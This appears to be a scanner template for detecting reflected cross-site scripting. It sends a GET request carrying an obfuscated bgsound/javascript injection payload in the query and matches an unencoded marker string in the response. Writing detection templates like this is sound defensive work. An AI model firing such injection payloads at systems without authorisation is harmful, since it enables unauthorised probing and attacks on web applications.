id: xss5-2689
name: 'Raw XSS5 in query'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in query'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      query:
        - '<bgsound%0asrc=javascript:nx52688>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx52688'
